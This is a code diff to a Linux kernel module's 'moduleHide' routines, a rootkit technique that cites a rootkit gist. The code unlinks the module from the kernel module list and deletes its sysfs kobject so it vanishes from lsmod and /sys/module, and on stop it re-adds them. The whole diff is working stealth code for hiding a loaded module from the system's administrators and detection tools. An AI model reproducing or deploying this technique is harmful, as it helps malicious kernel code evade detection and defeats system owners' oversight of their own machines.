@@ -10,7 +10,6 @@
 // http://isis.poly.edu/kulesh/stuff/src/klist/ - kernel lists explained
 
 static struct list_head *entryBeforeOutModuleInTheKernelModulesList;
-static struct list_head *module_kobj_previous;
 static bool started = false;
 
 
@@ -24,10 +23,9 @@ int moduleHide_start(void) {
 	entryBeforeOutModuleInTheKernelModulesList = THIS_MODULE->list.prev;
 	list_del(&THIS_MODULE->list);
 
-	// Hide from /sys/module 	based on  https://gist.github.com/ivyl/3964594/raw/fbdbbe7261939dcb829f37b2ed11795060ac3364/rt.c
-	module_kobj_previous = THIS_MODULE->mkobj.kobj.entry.prev;
-	//kobject_del(&THIS_MODULE->mkobj.kobj);
+	// Hide from /sys/module
 	list_del(&THIS_MODULE->mkobj.kobj.entry);
+	kobject_del(&THIS_MODULE->mkobj.kobj);
 
 
 	return 0;
@@ -38,10 +36,9 @@ void moduleHide_stop(void) {
 	if (!started) return;
 	started = false;
 
+	//	based on  https://gist.github.com/ivyl/3964594/raw/fbdbbe7261939dcb829f37b2ed11795060ac3364/rt.c
 	list_add(&THIS_MODULE->list, entryBeforeOutModuleInTheKernelModulesList);
-
-	list_add(&THIS_MODULE->mkobj.kobj.entry, module_kobj_previous);
-	//object_add(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.parent, THIS_MODULE->name);
+	kobject_add(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.parent, THIS_MODULE->name);
 	//todo: check result of kobject_add
 }
 
